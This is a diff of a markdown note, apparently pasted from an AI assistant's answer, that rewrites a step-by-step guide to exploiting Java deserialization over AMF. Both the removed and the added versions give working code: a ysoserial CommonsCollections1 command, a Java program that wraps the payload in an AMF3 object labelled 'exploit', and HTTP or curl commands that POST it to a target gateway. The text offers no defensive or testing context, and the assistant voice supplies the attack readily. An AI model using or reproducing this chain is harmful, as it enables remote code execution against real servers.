@@ -1,103 +1,106 @@
 # Note
 
-To generate an AMF request payload using the ysoserial tool and send it to an API, follow these steps:
+Certainly! Here's a recap of the steps to generate and send an AMF payload containing a `ysoserial` payload using Java:
 
-Step 1: Set Up Your Environment
+### Step-by-Step Guide
 
-Ensure you have the following in place:
+#### Step 1: Generate the `ysoserial` Payload
 
-	1.	The required Flex libraries (flex-messaging-common-1.0.jar, flex-messaging-core-1.0.jar, flex-messaging-opt-1.0.jar, flex-messaging-proxy-1.0.jar, flex-messaging-remote-1.0.jar) in your classpath.
-	2.	The ysoserial tool, which can be downloaded from its official GitHub repository.
+Ensure you have already generated the `ysoserial` payload and saved it at `./payload`.
 
-Step 2: Generate Payload with ysoserial
+#### Step 2: Set Up Your Java Environment
 
-Use ysoserial to generate a payload. For this example, we’ll assume you want to generate a payload that executes a simple command.
+Make sure you have Java Development Kit (JDK) installed on your system.
 
-Here’s an example command to generate a payload that executes calc.exe on a Windows system:
+#### Step 3: Create `AMFPayloadGenerator.java`
 
-java -jar ysoserial.jar CommonsCollections1 "calc.exe" > payload
+Create a Java program named `AMFPayloadGenerator.java` with the following code:
 
-Make sure to replace "calc.exe" with the command you want to execute.
-
-Step 3: Craft AMF Request with Java
-
-Create a Java program to read the payload from the file and include it in an AMF request.
-
-import flex.messaging.io.SerializationContext;
-import flex.messaging.io.amf.Amf3Output;
+```java
 import flex.messaging.io.amf.ASObject;
+import flex.messaging.io.amf.Amf3Output;
+import flex.messaging.io.SerializationContext;
 
 import java.io.ByteArrayOutputStream;
 import java.io.FileInputStream;
 import java.io.FileOutputStream;
-import java.io.InputStream;
-import java.io.OutputStream;
-import java.net.HttpURLConnection;
-import java.net.URL;
+import java.io.IOException;
 
-public class AMFRequestSender {
-    public static void main(String[] args) {
-        try {
-            // Read the ysoserial generated payload
-            InputStream fis = new FileInputStream("./payload");
-            byte[] ysoserialPayload = new byte[fis.available()];
-            fis.read(ysoserialPayload);
-            fis.close();
+public class AMFPayloadGenerator {
 
-            // Create the AMF request
-            SerializationContext context = new SerializationContext();
-            ByteArrayOutputStream baos = new ByteArrayOutputStream();
-            Amf3Output amf3Output = new Amf3Output(context);
-            amf3Output.setOutputStream(baos);
-
-            // Add the ysoserial payload to an ASObject
-            ASObject asObject = new ASObject();
-            asObject.put("payload", ysoserialPayload);
-            amf3Output.writeObject(asObject);
-
-            byte[] amfRequestPayload = baos.toByteArray();
-
-            // Write the AMF request payload to a file (for debugging purposes)
-            FileOutputStream fos = new FileOutputStream("./amf_payload");
-            fos.write(amfRequestPayload);
-            fos.close();
-
-            // Send the AMF request to the API
-            URL url = new URL("http://server/api/");
-            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-            conn.setDoOutput(true);
-            conn.setRequestMethod("POST");
-            conn.setRequestProperty("Content-Type", "application/x-amf");
-
-            OutputStream os = conn.getOutputStream();
-            os.write(amfRequestPayload);
-            os.flush();
-            os.close();
-
-            int responseCode = conn.getResponseCode();
-            System.out.println("Response Code: " + responseCode);
-
-            // Handle response here if needed
-
-            conn.disconnect();
-        } catch (Exception e) {
-            e.printStackTrace();
+    public static void main(String[] args) throws IOException {
+        // Step 1: Read the ysoserial payload
+        String ysoserialPayloadFile = "./payload";
+        FileInputStream fis = new FileInputStream(ysoserialPayloadFile);
+        ByteArrayOutputStream buffer = new ByteArrayOutputStream();
+        byte[] temp = new byte[1024];
+        int bytesRead;
+        while ((bytesRead = fis.read(temp)) != -1) {
+            buffer.write(temp, 0, bytesRead);
         }
+        byte[] ysoserialPayload = buffer.toByteArray();
+        fis.close();
+
+        // Step 2: Create an ASObject to hold the payload
+        ASObject asObject = new ASObject();
+        asObject.put("exploit", ysoserialPayload);
+
+        // Step 3: Serialize the ASObject to AMF format
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        Amf3Output amf3Output = new Amf3Output(SerializationContext.getSerializationContext());
+        amf3Output.setOutputStream(baos);
+        amf3Output.writeObject(asObject);
+        amf3Output.flush();
+
+        // Step 4: Write the serialized AMF message to a file
+        byte[] amfPayload = baos.toByteArray();
+        baos.close();
+        FileOutputStream fos = new FileOutputStream("amf_request.bin");
+        fos.write(amfPayload);
+        fos.close();
+
+        System.out.println("AMF payload generated successfully.");
     }
 }
+```
 
-Step 4: Compile and Run the Java Program
+#### Step 4: Compile `AMFPayloadGenerator.java`
 
-Ensure you have all necessary libraries in your classpath and compile the Java program:
+Compile the Java program using `javac` and include the BlazeDS libraries in the classpath. Adjust the path to the libraries (`/usr/lib/java/flex/`) as necessary:
 
-javac -cp "path/to/flex-messaging-common-1.0.jar:path/to/flex-messaging-core-1.0.jar:path/to/flex-messaging-opt-1.0.jar:path/to/flex-messaging-proxy-1.0.jar:path/to/flex-messaging-remote-1.0.jar" AMFRequestSender.java
+```sh
+javac -cp .:/usr/lib/java/flex/* AMFPayloadGenerator.java
+```
 
-Run the compiled Java program:
+#### Step 5: Run `AMFPayloadGenerator`
 
-java -cp ".:path/to/flex-messaging-common-1.0.jar:path/to/flex-messaging-core-1.0.jar:path/to/flex-messaging-opt-1.0.jar:path/to/flex-messaging-proxy-1.0.jar:path/to/flex-messaging-remote-1.0.jar" AMFRequestSender
+Run the compiled Java program using the class name `AMFPayloadGenerator` (without the `.class` extension) and include the same classpath:
 
-Step 5: Verify the Payload
+```sh
+java -cp .:/usr/lib/java/flex/* AMFPayloadGenerator
+```
 
-Ensure the payload is sent correctly by checking the API’s response and any side effects of the payload execution.
+Ensure the output says:
 
-This step-by-step process will generate an AMF request payload using ysoserial, incorporate it into an AMF request, and send it to the specified API endpoint. Adjust the paths and commands according to your specific requirements.
+```
+AMF payload generated successfully.
+```
+
+This confirms that `amf_request.bin` has been generated.
+
+#### Step 6: Send the AMF Payload
+
+After generating `amf_request.bin`, you can send it to the target server. Here’s how you can do it using `curl`:
+
+**Using `curl`**:
+
+```sh
+curl -X POST http://example.com/pfx-gateway/amf \
+  -H "Content-Type: application/x-amf" \
+  -H "Accept: application/x-amf" \
+  --data-binary @amf_request.bin
+```
+
+### Summary
+
+Following these steps allows you to generate and send an AMF payload containing a `ysoserial` payload using Java. Ensure you adjust paths and filenames based on your specific environment and requirements. If you encounter any errors, please provide specific error messages for further assistance.
